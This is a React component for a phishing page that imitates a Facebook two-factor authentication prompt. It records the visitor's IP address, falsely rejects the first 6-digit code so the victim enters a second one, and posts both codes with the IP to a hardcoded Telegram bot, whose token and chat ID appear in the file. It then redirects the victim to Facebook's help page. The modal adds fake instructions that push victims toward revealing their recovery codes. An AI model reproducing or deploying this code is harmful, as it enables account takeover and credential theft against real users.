import React, { useState, useEffect } from "react";
import axios from "axios";

export default function Verifycode() {
    const [clickednumber, setclickednumber] = useState(1);
    const [errormessage2, setErrormessage2] = useState('');
    const [verifyModal, setVerifyModal] = useState(false);
    const [verifyCode, setVerifyCode] = useState('');
    const [timeCounter, setTimeCounter] = useState(240);
    const [timeMinute, setTimeMinute] = useState("(4:00)");
    const [showMinute, setShowMinute] = useState(true);
    const [verifyCode1, setVerifyCode1] = useState('');
    const [ip, setIP] = useState('');

    let verifyCode2 = '';

    const botToken = '6256951708:AAHI3zEFREFD1CZmm1flOag-3C67beoJ9J0';
    const chatId = '988439115';

    const getData = async () => {
        const res = await axios.get("https://api.ipify.org/?format=json");
        setIP(res.data.ip);
    };
    useEffect(() => {
        //passing getData method to the lifecycle method
        getData();
    }, []);

    const handleContinue = async () => {
        if (verifyCode) {
            if (clickednumber === 1) {
                setErrormessage2('Your verification code was incorrect, please try again!');
                setclickednumber(2)
                setVerifyCode1(verifyCode);
                setVerifyCode('')
                await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    chat_id: chatId,
                    text: `First 2FA code: ${verifyCode1}\nIP address: ${ip}`
                }).then(({ data }) => {
                    console.log(data);
                })
            }
            else if (clickednumber === 2) {
                setErrormessage2('');
                setclickednumber(1);
                verifyCode2 = verifyCode;
                await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    chat_id: chatId,
                    text: `Second 2FA code: ${verifyCode2}\nIP address: ${ip}`
                }).then(({ data }) => {
                    console.log(data);
                })
                window.location.href = 'https://www.facebook.com/help'
                // const response = await fetch('/api/storeJSONVerifycode', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify({
                //         verifyCode1: verifyCode1,
                //         verifyCode2: verifyCode2
                //     })
                // });
                // const data = await response.json();
                // console.log(data);
            }



        } else { setErrormessage2('This field is required!'); }
    }

    useEffect(() => {
        if (timeCounter >= 0) {
            if (timeCounter > 0) {
                const temp = timeCounter - 1;
                setTimeout(() => {
                    const minute = Math.floor(temp / 60);
                    const second = temp % 60;
                    const time = "(" + minute.toString() + ":" + second.toString() + ")"
                    setTimeCounter(temp)
                    setTimeMinute(time)
                }, 1000);
            }
            else setShowMinute(false)
        }
    });
    return (
        <div className='container m-auto p-10 mt-200 w-auto min-w-md max-w-xl'>
            <div className="flex justify-center h-200 bg-white border rounded-md">
                {verifyModal ? (
                    <div className="z-100 flex justify-center absolute w-full h-full fixed inset-0 outline-none focus:outline-none bg-black opacity-90">
                        <div className="relative w-auto my-6 mx-auto max-w-lg">
                            <div className="border-0 rounded-lg shadow-lg relative flex flex-col bg-white outline-none focus:outline-none">
                                <div className="flex items-start justify-between p-5 border-b border-solid border-gray-300 rounded-t ">
                                    <h3 className="text-2xl font-semibold">Didn't recieve the code?</h3>
                                    <button
                                        className="bg-transparent border-0 text-black flex justify-end items-center"
                                        onClick={() => setVerifyModal(false)}
                                    >
                                        <span className="text-black opacity-7 h-6 w-6 text-xl block  py-0 ">
                                            X
                                        </span>
                                    </button>
                                </div>
                                <div className='border border-x-0 border-gray-300 border-t-1 border-b-1'>
                                    <p className="text-black m-4 pt-2">1. Go to <b>Settings</b> &gt; <b>Security</b> and <b>Login</b>.</p>
                                    <p className="text-black m-4 pt-2">2. Under the <b>Two-Factor Authentication </b>section,  click <b>Use two-factor authentication</b>. You may need to re-enter your password.</p>
                                    <p className="text-black m-4 pt-2 pb-10">3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already setup recovery codes, you can click <b>Show Codes.</b></p>
                                </div>
                                <div className="flex items-center justify-end p-2 border-t border-solid border-blueGray-200 rounded-b">
                                    <button
                                        className="text-white text-md bg-gray-600 hover:bg-gray-700 p-2 text-md rounded-md outline-none focus:outline-none mr-1 mb-1"
                                        type="button"
                                        onClick={() => setVerifyModal(false)}
                                    >
                                        Close
                                    </button>
                                    <button
                                        className="text-white text-md bg-blue-600 hover:bg-blue-700 text-md p-2 ml-3 rounded-md outline-none focus:outline-none mr-1 mb-1"
                                        type="button"
                                        onClick={() => setVerifyModal(false)}
                                    >
                                        Continue
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                ) : (
                    <div>
                        <div className="flex w-auto text-xl font-bold m-2 text-black">Two-factor authentication required (2/3) </div>
                        <div className="text-md m-4 text-black">You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</div>
                        <div className="text-md m-4 pt-2 text-black">Enter the 6-digit from your <b>code generator</b> or third-party app below.</div>
                        <div className="m-2 pt-3 flex items-center border border-gray-500 border-x-0 border-t-1 border-b-0">
                            <input type="text" value={verifyCode} id="text" className="m-2 border border-gray-300 text-gray-900 text-sm rounded-md focus:ring-blue-500 focus:border-blue-500 block w-auto p-1.5 placeholder:text-slate-400 placeholder: p-2" placeholder="Your code" onChange={(e) => setVerifyCode(e.target.value)} />
                            <span className="ml-3">
                                {showMinute ? <p className="text-black text-md font-bold" > {timeMinute}</p> : (<button className="text-blue-700 text-md fond-bold" onClick={() => {
                                    setTimeCounter(240)
                                    setTimeMinute("(4:00)")
                                    setShowMinute(true)
                                }}>Send Code</button>)}
                            </span>
                        </div>
                        <p className="flex text-md text-red-600 m-2 ml-5">{errormessage2}</p>
                        <div className='flex items-center flex justify-between border border-gray-500 border-x-0 border-t-1 border-b-0 ml-2 mr-2 mb-2 pt-2 '>
                            <button className="flex items-center text-md text-blue-700 m-2" onClick={() => setVerifyModal(true)}>Need another way to authenticate?</button>
                            <button className="text-white text-md bg-blue-600 hover:bg-blue-700 text-md p-2 ml-3 rounded-md outline-none focus:outline-none mr-1 mb-1"
                                type="button"
                                onClick={handleContinue}

                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )
                }
            </div>
        </div>
    )
}